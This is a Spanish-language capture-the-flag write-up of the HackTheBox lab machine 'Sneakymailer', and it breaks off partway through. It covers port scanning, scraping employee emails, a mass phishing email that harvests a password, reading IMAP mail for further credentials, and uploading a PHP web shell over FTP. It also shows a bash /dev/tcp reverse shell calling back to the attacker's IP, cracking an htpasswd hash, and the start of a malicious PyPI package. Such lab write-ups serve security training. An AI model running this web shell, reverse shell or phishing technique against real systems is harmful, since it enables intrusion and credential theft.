---
layout      : post
title       : "Maquina Sneakymailer - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Sneakymailer/sneaky_logo.jpg
category    : [ hackthebox ]
tags        : [ Information Leaked,  Emailing Attack, Abussing Pypi Server, Sudoers Privilege pip3 ]
---

Hoy vamos a resolver una máquina `hackthebox` de dificultad `media`, la cual explotaremos a partir de información lekeada y realizando un ataque masivo de email, después migraremos a otro usuario abusando de un `pypi server` creando un paquete malicioso y finalmente escalaremos privilegios como el usuario `root` abusando de un privilegio de sudoers en `pip3`.

Vamos a comenzar creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Sneakymailer
❯ ls
 Sneakymailer
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap, content, scripts}
}
❯ mkt
❯ ls
 content   nmap   scripts
```

## Enumeración [#](#enumeracion) {#enumeracion}
 

Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeración, empezamos mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.197
PING 10.10.10.197 (10.10.10.197) 56(84) bytes of data.
64 bytes from 10.10.10.197: icmp_seq=1 ttl=63 time=2582 ms

--- 10.10.10.197 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 2582.173/2582.173/2582.173/0.000 ms
```
Vemos que la maquina nos responde ahora procederemos a el scaneo de puertos con la ayuda de `nmap`:

### Escaneo de Puertos

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `allPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.197 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-08 21:19 GMT
Initiating SYN Stealth Scan at 21:19
Scanning 10.10.10.197 [65535 ports]
Discovered open port 80/tcp on 10.10.10.197
Discovered open port 22/tcp on 10.10.10.197
Discovered open port 21/tcp on 10.10.10.197
Discovered open port 25/tcp on 10.10.10.197
Discovered open port 8080/tcp on 10.10.10.197
Discovered open port 143/tcp on 10.10.10.197
Discovered open port 993/tcp on 10.10.10.197
Completed SYN Stealth Scan at 21:20, 20.33s elapsed (65535 total ports)
Nmap scan report for 10.10.10.197
Host is up, received user-set (0.31s latency).
Scanned at 2023-04-08 21:19:57 GMT for 20s
Not shown: 63699 closed tcp ports (reset), 1829 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
21/tcp   open  ftp        syn-ack ttl 63
22/tcp   open  ssh        syn-ack ttl 63
25/tcp   open  smtp       syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
143/tcp  open  imap       syn-ack ttl 63
993/tcp  open  imaps      syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.46 seconds
           Raw packets sent: 98589 (4.338MB) | Rcvd: 88844 (3.554MB)
```

### Escaneo de Version y Servicios.

```java
❯ nmap -sCV -p21,22,25,80,143,993,8080 10.10.10.197 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-08 21:21 GMT
Nmap scan report for 10.10.10.197
Host is up (0.40s latency).

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
80/tcp   open  http     nginx 1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
|_http-server-header: nginx/1.14.2
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: THREAD=REFERENCES OK IDLE CHILDREN ACL2=UNION STARTTLS UIDPLUS SORT NAMESPACE ACL completed CAPABILITY QUOTA IMAP4rev1 UTF8=ACCEPTA0001 ENABLE THREAD=ORDEREDSUBJECT
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
993/tcp  open  ssl/imap Courier Imapd (released 2018)
|_imap-capabilities: THREAD=REFERENCES OK IDLE CHILDREN ACL2=UNION UIDPLUS SORT NAMESPACE ACL AUTH=PLAIN completed CAPABILITY QUOTA IMAP4rev1 UTF8=ACCEPTA0001 ENABLE THREAD=ORDEREDSUBJECT
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.06 seconds
```
Visulizamos información interesante de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 21     | FTP      | vsftpd 3.0.3 |
| 22   | SSH    | OpenSSH 7.9p1 |
| 25   | SMTP   | Postfix smtpd | 
| 80   | HTTP   | nginx 1.14.2 |
| 143  |  IMAP  | Courier Imapd | 
| 993  | IMAP/SSL | Courier Imapd |
| 8080 | HTTP | nginx 1.14.2 |



Comenzando primeramente intentaremos conectarnos como el usuario `anonymous` por el servicio `ftp`

```bash
❯ ftp 10.10.10.197
Connected to 10.10.10.197.
220 (vsFTPd 3.0.3)
Name (10.10.10.197:fmiracle): anonymous
530 Permission denied.
Login failed.
ftp>
```

Vemos que no contamos con acceso asi que proseguiremos a usar la herramienta `whatweb` para ver el gestor de contenido de los servicios `http`

```bash
❯ whatweb http://10.10.10.197
http://10.10.10.197 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.2], IP[10.10.10.197], RedirectLocation[http://sneakycorp.htb], Title[301 Moved Permanently], nginx[1.14.2]
http://sneakycorp.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.10.197], JQuery, Script, Title[Employee - Dashboard], X-UA-Compatible[IE=edge], nginx[1.14.2]
❯ whatweb http://10.10.10.197:8080
http://10.10.10.197:8080 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.10.197], Title[Welcome to nginx!], nginx[1.14.2]
```

`whatweb` nos reporta que se esta aplicando virtual hosting, concretamente al dominio `http://sneakycorp.htb` asi que comenzemos agregandolo a nuestro `/etc/hosts`

```bash
echo "10.10.10.197 sneakycorp.htb" >> /etc/hosts
```

## Explotación [#](#explotación) {#explotación}

Vamos a proceder a abrir la pagina web.

![](/assets/images/HTB/htb-writeup-Sneakymailer/sneaky1.PNG)

Podemos observar un proyecto que nos habla de pypi, pero que es `pypi`

> El Python Package Index o PyPI es el repositorio de software oficial para aplicaciones de terceros en el lenguaje de programación Python. 

![](/assets/images/HTB/htb-writeup-Sneakymailer/sneaky2.PNG)

Observamos un potencial de correos filtrados de la compañia

Parceamos los correos filtrados usando la siguente expresión y los exportamos a un fichero de nombre `mails.txt`

```bash
curl -s -X GET "http://sneakycorp.htb/team.php" | grep "sneakymailer" | html2text | xargs | tr ' ' ',' > mails.txt
❯ /bin/cat mails.txt
tigernixon@sneakymailer.htb,garrettwinters@sneakymailer.htb,ashtoncox@sneakymailer.htb,cedrickelly@sneakymailer.htb,airisatou@sneakymailer.htb,briellewilliamson@sneakymailer.htb,herrodchandler@sneakymailer.htb,rhonadavidson@sneakymailer.htb,colleenhurst@sneakymailer.htb,sonyafrost@sneakymailer.htb,jenagaines@sneakymailer.htb,quinnflynn@sneakymailer.htb,chardemarshall@sneakymailer.htb,haleykennedy@sneakymailer.htb,tatyanafitzpatrick@sneakymailer.htb,michaelsilva@sneakymailer.htb,paulbyrd@sneakymailer.htb,glorialittle@sneakymailer.htb,bradleygreer@sneakymailer.htb,dairios@sneakymailer.htb,jenettecaldwell@sneakymailer.htb,yuriberry@sneakymailer.htb,caesarvance@sneakymailer.htb,doriswilder@sneakymailer.htb,angelicaramos@sneakymailer.htb,gavinjoyce@sneakymailer.htb,jenniferchang@sneakymailer.htb,brendenwagner@sneakymailer.htb,fionagreen@sneakymailer.htb,shouitou@sneakymailer.htb,michellehouse@sneakymailer.htb,sukiburks@sneakymailer.htb,prescottbartlett@sneakymailer.htb,gavincortez@sneakymailer.htb,martenamccray@sneakymailer.htb,unitybutler@sneakymailer.htb,howardhatfield@sneakymailer.htb,hopefuentes@sneakymailer.htb,vivianharrell@sneakymailer.htb,timothymooney@sneakymailer.htb,jacksonbradshaw@sneakymailer.htb,olivialiang@sneakymailer.htb,brunonash@sneakymailer.htb,sakurayamamoto@sneakymailer.htb,thorwalton@sneakymailer.htb,finncamacho@sneakymailer.htb,sergebaldwin@sneakymailer.htb,zenaidafrank@sneakymailer.htb,zoritaserrano@sneakymailer.htb,jenniferacosta@sneakymailer.htb,carastevens@sneakymailer.htb,hermionebutler@sneakymailer.htb,laelgreer@sneakymailer.htb,jonasalexander@sneakymailer.htb,shaddecker@sneakymailer.htb,sulcud@sneakymailer.htb,donnasnider@sneakymailer.htb
```

Como antes nos reporto `nmap` el servicio `imap` se encuentra activo y como ahora disponemos de una lista de correos, podemos tratar de enviar un correo como cualquier usuario y ver si se nos permite de estar mal configurado.


Para eso usaremos la herramienta `swaks` 

> para instalar la herramienta solo basta con hacer un apt install swaks

Especificaremos con los comandos `from` el correo origen, `--to` la lista de correos que obtuvimos, en el `body` podemos tratar de enviar un enlace a un servidor `http` que nos compartiremos de manera local, de modo que si alguno de los usuarios destinatarios esta abriendo el correo y pinche en el enlace, causara que nos envie una solicitud.

```bash
❯ swaks --from fmiracle@sneakymailer.htb --to tigernixon@sneakymailer.htb,garrettwinters@sneakymailer.htb,ashtoncox@sneakymailer.htb,cedrickelly@sneakymailer.htb,airisatou@sneakymailer.htb,briellewilliamson@sneakymailer.htb,herrodchandler@sneakymailer.htb,rhonadavidson@sneakymailer.htb,colleenhurst@sneakymailer.htb,sonyafrost@sneakymailer.htb,jenagaines@sneakymailer.htb,quinnflynn@sneakymailer.htb,chardemarshall@sneakymailer.htb,haleykennedy@sneakymailer.htb,tatyanafitzpatrick@sneakymailer.htb,michaelsilva@sneakymailer.htb,paulbyrd@sneakymailer.htb,glorialittle@sneakymailer.htb,bradleygreer@sneakymailer.htb,dairios@sneakymailer.htb,jenettecaldwell@sneakymailer.htb,yuriberry@sneakymailer.htb,caesarvance@sneakymailer.htb,doriswilder@sneakymailer.htb,angelicaramos@sneakymailer.htb,gavinjoyce@sneakymailer.htb,jenniferchang@sneakymailer.htb,brendenwagner@sneakymailer.htb,fionagreen@sneakymailer.htb,shouitou@sneakymailer.htb,michellehouse@sneakymailer.htb,sukiburks@sneakymailer.htb,prescottbartlett@sneakymailer.htb,gavincortez@sneakymailer.htb,martenamccray@sneakymailer.htb,unitybutler@sneakymailer.htb,howardhatfield@sneakymailer.htb,hopefuentes@sneakymailer.htb,vivianharrell@sneakymailer.htb,timothymooney@sneakymailer.htb,jacksonbradshaw@sneakymailer.htb,olivialiang@sneakymailer.htb,brunonash@sneakymailer.htb,sakurayamamoto@sneakymailer.htb,thorwalton@sneakymailer.htb,finncamacho@sneakymailer.htb,sergebaldwin@sneakymailer.htb,zenaidafrank@sneakymailer.htb,zoritaserrano@sneakymailer.htb,jenniferacosta@sneakymailer.htb,carastevens@sneakymailer.htb,hermionebutler@sneakymailer.htb,laelgreer@sneakymailer.htb,jonasalexander@sneakymailer.htb,shaddecker@sneakymailer.htb,sulcud@sneakymailer.htb,donnasnider@sneakymailer.htb --body "Entra aqui -> http://10.10.16.2/test" --server 10.10.10.197
=== Trying 10.10.10.197:25...
=== Connected to 10.10.10.197.
<-  220 debian ESMTP Postfix (Debian/GNU)
 -> EHLO hack4u
<-  250-debian
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250-SMTPUTF8
<-  250 CHUNKING
 -> MAIL FROM:<fmiracle@sneakymailer.htb>
<-  250 2.1.0 Ok
 -> RCPT TO:<tigernixon@sneakymailer.htb>
```

Nos ponemos en escucha con `ncat` en el puerto `80` y recibimos una petición post.

```bash
❯ ncat -nlvp 80
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:39458.
POST /test HTTP/1.1
Host: 10.10.16.2
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
```

Tramos la data y lo exportamos a un ficherito llamando `credentials.txt`, donde podemos ver las credenciales de el usuario `Paul`

```bash
❯ php --interactive
Interactive mode enabled

php > echo urldecode("firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt");
firstName=Paul&lastName=Byrd&email=paulbyrd@sneakymailer.htb&password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht&rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht

❯ /bin/cat credentials.txt
firstName=Paul
lastName=Byrd
email=paulbyrd@sneakymailer.htb
password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
```

Ahora provaremos conectarnos con `telnet` al puerto `143` con esas credenciales.

> Puedes guiarte de este articulo donde se explica a detalle como realizar la conexión con telnet y hacer uso de los parametros.

* [Connect-to-imap-server-with-telnet](https://blog.andrewc.com/2013/01/connect-to-imap-server-with-telnet/)

```bash
❯ telnet 10.10.10.197 143
Trying 10.10.10.197...
Connected to 10.10.10.197.
Escape character is '^]'.
* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.
a1 LOGIN paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)
a1 OK LOGIN Ok.
a2 LIST "" "*"
* LIST (\Unmarked \HasChildren) "." "INBOX"
* LIST (\HasNoChildren) "." "INBOX.Trash"
* LIST (\HasNoChildren) "." "INBOX.Sent"
* LIST (\HasNoChildren) "." "INBOX.Deleted Items"
* LIST (\HasNoChildren) "." "INBOX.Sent Items"
a2 OK LIST completed
a3 EXAMINE "INBOX.Trash"
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS ()] No permanent flags permitted
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 590600304] Ok
* OK [MYRIGHTS "acdilrsw"] ACL
a3 OK [READ-ONLY] Ok
a4 EXAMINE "INBOX.Sent"
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS ()] No permanent flags permitted
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 590600538] Ok
* OK [MYRIGHTS "acdilrsw"] ACL
a4 OK [READ-ONLY] Ok
a5 EXAMINE "INBOX.Deleted Items"
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS ()] No permanent flags permitted
* 0 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 589481592] Ok
* OK [MYRIGHTS "acdilrsw"] ACL
a5 OK [READ-ONLY] Ok
a6 EXAMINE "INBOX.Sent Items"
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS ()] No permanent flags permitted
* 2 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 589480766] Ok
* OK [MYRIGHTS "acdilrsw"] ACL
a6 OK [READ-ONLY] Ok
```

Examinado la ultima bandeja encontramos 2 correos existentes y visualizando el primer correo optenemos unas credenciales del usuario `developer`

```bash
a7 FETCH 1 BODY[]
* 1 FETCH (BODY[] {2167}
MIME-Version: 1.0
To: root <root@debian>
From: Paul Byrd <paulbyrd@sneakymailer.htb>
Subject: Password reset
Date: Fri, 15 May 2020 13:03:37 -0500
Importance: normal
X-Priority: 3
Content-Type: multipart/alternative;
	boundary="_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_"

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset="utf-8"

Hello administrator, I want to change this password for the developer accou=
nt

Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C

Please notify me when you do it=20

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html; charset="utf-8"

<html xmlns:o=3D"urn:schemas-microsoft-com:office:office" xmlns:w=3D"urn:sc=
hemas-microsoft-com:office:word" xmlns:m=3D"http://schemas.microsoft.com/of=
fice/2004/12/omml" xmlns=3D"http://www.w3.org/TR/REC-html40"><head><meta ht=
tp-equiv=3DContent-Type content=3D"text/html; charset=3Dutf-8"><meta name=
=3DGenerator content=3D"Microsoft Word 15 (filtered medium)"><style><!--
/* Font Definitions */
@font-face
	{font-family:"Cambria Math";
	panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
	{font-family:Calibri;
	panose-1:2 15 5 2 2 2 4 3 2 4;}
/* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{margin:0in;
	margin-bottom:.0001pt;
	font-size:11.0pt;
	font-family:"Calibri",sans-serif;}
.MsoChpDefault
	{mso-style-type:export-only;}
@page WordSection1
	{size:8.5in 11.0in;
	margin:1.0in 1.0in 1.0in 1.0in;}
div.WordSection1
	{page:WordSection1;}
--></style></head><body lang=3DEN-US link=3Dblue vlink=3D"#954F72"><div cla=
ss=3DWordSection1><p class=3DMsoNormal>Hello administrator, I want to chang=
e this password for the developer account</p><p class=3DMsoNormal><o:p>&nbs=
p;</o:p></p><p class=3DMsoNormal>Username: developer</p><p class=3DMsoNorma=
l>Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</p><p class=3DMsoNorm=
al><o:p>&nbsp;</o:p></p><p class=3DMsoNormal>Please notify me when you do i=
t </p></div></body></html>=

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_--
)
a7 OK FETCH completed.
```

Como ahora disponemos de credenciales nuevas:

* `developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C`


Volemos a tratar de conectarnos por `ftp` y esta vez la conexión es exitosa.

```bash
❯ ftp 10.10.10.197
Connected to 10.10.10.197.
220 (vsFTPd 3.0.3)
Name (10.10.10.197:fmiracle): developer
331 Please specify the password.
Password:
230 Login successful.

Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxr-x    8 0        1001         4096 Jun 30  2020 dev
226 Directory send OK.
ftp> cd dev
250 Directory successfully changed.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 26  2020 css
drwxr-xr-x    2 0        0            4096 May 26  2020 img
-rwxr-xr-x    1 0        0           13742 Jun 23  2020 index.php
drwxr-xr-x    3 0        0            4096 May 26  2020 js
drwxr-xr-x    2 0        0            4096 May 26  2020 pypi
drwxr-xr-x    4 0        0            4096 May 26  2020 scss
-rwxr-xr-x    1 0        0           26523 May 26  2020 team.php
drwxr-xr-x    8 0        0            4096 May 26  2020 vendor
226 Directory send OK.
ftp>
```

Despues de conectarnos visualizamos un directorio `dev` y dentro un contenido de nombre `team.php`, que curiosamente era la ruta de la pagina donde estaban expuestos los correos.

Para poder saber si tenemos permiso de escritura intentaremos subir un archivo de nombre `cmd.php` que con el uso de la función `shell_exec` me ejecute un comando a nivel de sistema que vamos a controlar con el parametro `cmd`

```php
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Comprobamos que efectivamente si podemos subir el archivo

```bash
ftp> put cmd.php
local: cmd.php remote: cmd.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
d226 Transfer complete.
69 bytes sent in 0.00 secs (811.8411 kB/s)
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
--wxrw-rw-    1 1001     1001           69 Apr 08 19:15 cmd.php
drwxr-xr-x    2 0        0            4096 May 26  2020 css
drwxr-xr-x    2 0        0            4096 May 26  2020 img
-rwxr-xr-x    1 0        0           13742 Jun 23  2020 index.php
drwxr-xr-x    3 0        0            4096 May 26  2020 js
drwxr-xr-x    2 0        0            4096 May 26  2020 pypi
drwxr-xr-x    4 0        0            4096 May 26  2020 scss
-rwxr-xr-x    1 0        0           26523 May 26  2020 team.php
drwxr-xr-x    8 0        0            4096 May 26  2020 vendor
226 Directory send OK.
ftp>
```

Visitamos la `url`, pero esta vez apuntaremos al fichero que subimos.


![](/assets/images/HTB/htb-writeup-Sneakymailer/sneaky3.PNG)

El servicio nos reporta un codigo de estado `400` lo que corresponde a que el archivo no existe...


Pero dado a que existe un directorio `dev` podemos pensar que puede ser un posible subdominio, asi que usaremos `gobuster` para tratar de enumerar posibles subdominios validos existentes y usaremos el diccionario `subdomains-top1million-5000.txt` del repositorio de `seclists`

* [Gobuster](https://github.com/OJ/gobuster)

* [SecLists](https://github.com/danielmiessler/SecLists)


```bash
❯ gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://sneakycorp.htb/ -t 200
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://sneakycorp.htb/
[+] Method:       GET
[+] Threads:      200
[+] Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/04/08 23:21:48 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.sneakycorp.htb (Status: 200) [Size: 13742]
                                                     
===============================================================
2023/04/08 23:21:58 Finished
===============================================================
```

Pues `gobuster` nos reporta que el subdominio es valido, lo que quiere decir que el archivo que subimos antes existe, pero bajo ese subdominio.


Procedemos a subir nuevamente el archivo ya que a intervalos de tiempo nos lo borra

```bash
ftp> put cmd.php
local: cmd.php remote: cmd.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
69 bytes sent in 0.00 secs (990.9237 kB/s)
ftp>
```

Volvemos a visitar la `url` esta vez apuntando al subdominio y al archivo subido no sin antes agregar el subdominio a nuestro `/etc/hosts`

```bash
❯ echo "10.10.10.197 dev.sneakycorp.htb" >> /etc/hosts
```

Esta vez si podemos apuntar al archivo `cmd.php` y con el parametro `cmd` tal y como lo habiamos especificado, podemos ejecutar comandos.

![](/assets/images/HTB/htb-writeup-Sneakymailer/sneaky4.PNG)


Lo siguiente sera ganar acceso a la maquina, mandandonos una shell reversa a nuestra maquina local, ello lo haremos con `bash` con el comando `bash -c 'bash -i >& /dev/tcp/10.10.16.2/443 0>&1'`

No olvidemos poner los `&` en urleconde `%26` para evitar problemas, y enviamos la petición


![](/assets/images/HTB/htb-writeup-Sneakymailer/sneaky5.PNG)


Nos ponemos en escucha y recimos la conexión como el usuario `www-data`

```bash
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:37818.
bash: cannot set terminal process group (734): Inappropriate ioctl for device
bash: no job control in this shell
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ whoami
whoami
www-data
```

Como siempre al ser una maquina `linux` hacemos un tratamiento de la `tty` para que sea full interactiva y ajustamos el tamaño de las proporciones de la pantall.


```bash
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ export TERM=xterm
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ export SHELL=bash
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ stty rows 48 columns 184
```


Una vez en la maquina listamos los procesos corriendo y vemos uno correspondiente a `pypi`

```bash
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ ps -faux | grep 5000
www-data  7185  0.0  0.0   3084   824 pts/0    S+   19:49   0:00  |                           \_ grep 5000
pypi       741  0.0  0.6  36804 25824 ?        Ss   17:09   0:08 /var/www/pypi.sneakycorp.htb/venv/bin/python3 /var/www/pypi.sneakycorp.htb/venv/bin/pypi-server -i 127.0.0.1 -p 5000 -a update,download,list -P /var/www/pypi.sneakycorp.htb/.htpasswd --disable-fallback -o /var/www/pypi.sneakycorp.htb/packages
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$
```

Podemos ver que se establece un tipo de conexión procediente de un archivo asi que procederemos a leeerlo

```bash
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ cat /var/www/pypi.sneakycorp.htb/.htpasswd
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
```

Vemos una contraseña encryptada que procederemos a crackearla por fuerza bruta con `john`

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
soufianeelhaoui  (?)
1g 0:00:00:08 DONE (2023-04-08 23:53) 0.1172g/s 419023p/s 419023c/s 419023C/s soulfire1..souderton16
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Obtenemos nuevas credenciales `pypi:soufianeelhaoui`


Como vimos que por detras esta configurado un `nginx` vamos a listar los sitios disponibles del directorio `sites-available`

Encotramos el subdominio `pypi.sneakycorp.htb` que esta en escucha por el puerto `8080` 

```bash
www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ cat /etc/nginx/sites-available/pypi.sneakycorp.htb 
server {
	listen 0.0.0.0:8080 default_server;
	listen [::]:8080 default_server;
	server_name _;
}


server {
	listen 0.0.0.0:8080;
	listen [::]:8080;

	server_name pypi.sneakycorp.htb;

	location / {
		proxy_pass http://127.0.0.1:5000;
		proxy_set_header Host $host;
		proxy_set_header X-Real-IP $remote_addr;
	}
}
```

Agregamos el subdominio al `/etc/hosts`

```bash
❯ echo "10.10.10.197 pypi.sneakycorp.htb" >> /etc/hosts
```

Lo abrimos en el navegador


![](/assets/images/HTB/htb-writeup-Sneakymailer/sneaky6.PNG)


Como vemos un `pypi server` lo que podriamos hacer es tratar de crearnos nuestro propio paquete malicioso de `pypi` y tratar de subirlo a la maquina victima e intentar colar un comando en la maquina victima.


Ahora la pregunta es como creamos un paquete en python?


Solo debes seguir la guia de este recurso donde se explica a detalle como hacerlo

* [Create-a-private-python-package](https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/)


La estructura al crear un paquete debe ser similar a esta:

```python
linode_example/
    linode_example/
        __init__.py
    setup.py
    setup.cfg
    README.md
```

